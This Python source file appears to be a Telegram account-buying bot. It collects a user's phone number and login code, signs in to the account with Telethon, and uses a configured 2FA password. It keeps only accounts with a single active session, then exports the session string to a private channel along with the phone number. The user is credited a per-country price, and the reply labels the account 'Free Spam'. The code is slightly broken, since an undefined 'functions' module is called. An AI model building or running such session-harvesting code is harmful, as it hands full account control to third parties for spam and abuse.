from pyrogram import Client, filters
from pyrogram.types import Message, ReplyKeyboardRemove
from bot.config import ADMIN_ID, CHANNEL_ID, SESSION_2FA_PASSWORD
from bot.utils import storage
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
import asyncio
import random
import time
import os

user_state = {}

def init(app):
    @app.on_message(filters.command("start") & filters.private)
    async def start_command(client: Client, message: Message):
        user_id = message.from_user.id
        storage.register_user(user_id)
        user_state[user_id] = {"step": "awaiting_number"}

        await message.reply_text(
            "🎉 Welcome to Robot!\n\n"
            "Enter your phone number with the country code.\n"
            "Example: +62xxxxxxxxx\n\n"
            "Type /cap to see available countries.",
            reply_markup=ReplyKeyboardRemove()
        )

    @app.on_message(filters.private & filters.text)
    async def handle_steps(client: Client, message: Message):
        user_id = message.from_user.id

        if user_id not in user_state:
            return

        step = user_state[user_id].get("step")

        if step == "awaiting_number":
            phone_number = message.text.strip()
            user_state[user_id]["phone"] = phone_number
            user_state[user_id]["step"] = "awaiting_code"

            # Send OTP via Telethon
            api_id = client.config.API_ID
            api_hash = client.config.API_HASH

            telethon_client = TelegramClient(StringSession(), api_id, api_hash)
            await telethon_client.connect()

            try:
                sent = await telethon_client.send_code_request(phone_number)
                user_state[user_id]["telethon"] = telethon_client
                user_state[user_id]["phone_code_hash"] = sent.phone_code_hash
                user_state[user_id]["start_time"] = time.time()

                await message.reply_text("✅ OTP has been sent.\n\nNow enter the code you received.")
            except Exception as e:
                await telethon_client.disconnect()
                del user_state[user_id]
                return await message.reply_text(f"❌ Failed to send OTP:\n{e}")

        elif step == "awaiting_code":
            code = message.text.strip()
            phone = user_state[user_id]["phone"]
            telethon_client = user_state[user_id]["telethon"]
            phone_code_hash = user_state[user_id]["phone_code_hash"]
            start_time = user_state[user_id]["start_time"]

            verify_time = storage.get_verify_time()
            if time.time() - start_time > verify_time:
                await telethon_client.disconnect()
                del user_state[user_id]
                return await message.reply_text("⏱️ Verification time expired. Please /start again.")

            try:
                await telethon_client.sign_in(phone, code)
            except SessionPasswordNeededError:
                try:
                    await telethon_client.sign_in(password=SESSION_2FA_PASSWORD)
                except Exception as e:
                    await telethon_client.disconnect()
                    del user_state[user_id]
                    return await message.reply_text("❌ 2FA password incorrect or required.")

            except Exception as e:
                await telethon_client.disconnect()
                del user_state[user_id]
                return await message.reply_text(f"❌ Verification failed:\n{e}")

            # Check for multi-device
            sessions = await telethon_client(functions.account.GetAuthorizationsRequest())
            if len(sessions.authorizations) > 1:
                await telethon_client.disconnect()
                del user_state[user_id]
                return await message.reply_text("📵 Account has multiple active sessions. Rejected.")

            # Create session
            session_str = telethon_client.session.save()
            session_file = f"{user_id}.session"
            with open(session_file, "w") as f:
                f.write(session_str)

            # Send to private channel
            await client.send_document(
                chat_id=CHANNEL_ID,
                document=session_file,
                caption=f"✅ New verified session\nUser: `{user_id}`\nPhone: `{phone}`"
            )

            # Add balance
            country_code = phone[:3]
            rates = storage.get_country_rates()
            price = rates.get(country_code, 0)

            storage.update_balance(user_id, price)

            await message.reply_text(
                f"🎉 We have successfully processed your account\n\n"
                f"Number: {phone}\n"
                f"Price: ${price:.2f}\n"
                f"Status: Free Spam\n\n"
                f"Congratulations, has been added to your balance."
            )

            await telethon_client.disconnect()
            os.remove(session_file)
            del user_state[user_id]

